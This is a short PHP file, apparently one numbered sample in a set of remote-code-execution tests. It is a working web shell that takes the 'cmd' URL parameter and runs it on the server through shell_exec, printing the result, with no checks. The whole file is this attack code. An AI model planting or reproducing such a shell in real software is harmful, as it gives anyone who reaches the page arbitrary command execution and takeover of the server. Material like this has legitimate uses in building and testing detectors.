<?php
// RCE test variation #126
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>